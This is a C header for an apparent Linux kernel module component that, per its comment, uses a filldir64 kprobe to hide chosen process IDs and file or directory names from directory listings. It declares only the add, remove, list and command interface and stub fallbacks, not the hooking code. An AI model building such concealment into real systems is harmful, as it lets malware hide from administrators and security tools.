// SPDX-License-Identifier: GPL-2.0-only
// filldir64 kprobe that hides PIDs and file/dir names from every readdir path.
#ifndef DRIVER_DIRENT_HIDE_H
#define DRIVER_DIRENT_HIDE_H

#include <linux/types.h>

#define DIRENT_HIDE_MAX_PIDS 8

#if KCFG_HIDE_TASK

int dirent_hide_init(void);

int dirent_hide_pid_add(pid_t pid);
int dirent_hide_pid_remove(pid_t pid);
void dirent_hide_pid_clear(void);
int dirent_hide_pid_list(pid_t *out, size_t max);
bool dirent_hide_pid_contains(pid_t pid);

int dirent_hide_name_add(const char *name);
int dirent_hide_name_remove(const char *name);
void dirent_hide_name_clear(void);

long do_dirent_hide_cmd(unsigned int cmd, void __user *arg);

#else

#include <linux/errno.h>
static inline int dirent_hide_init(void) { return 0; }
static inline int dirent_hide_pid_add(pid_t pid) { (void)pid; return -EOPNOTSUPP; }
static inline int dirent_hide_pid_remove(pid_t pid) { (void)pid; return -EOPNOTSUPP; }
static inline void dirent_hide_pid_clear(void) { }
static inline int dirent_hide_pid_list(pid_t *out, size_t max) { (void)out; (void)max; return -EOPNOTSUPP; }
static inline bool dirent_hide_pid_contains(pid_t pid) { (void)pid; return false; }
static inline int dirent_hide_name_add(const char *n) { (void)n; return -EOPNOTSUPP; }
static inline int dirent_hide_name_remove(const char *n) { (void)n; return -EOPNOTSUPP; }
static inline void dirent_hide_name_clear(void) { }
static inline long do_dirent_hide_cmd(unsigned int cmd, void __user *arg) { (void)cmd; (void)arg; return -EOPNOTSUPP; }

#endif /* KCFG_HIDE_TASK */

#endif /* DRIVER_DIRENT_HIDE_H */
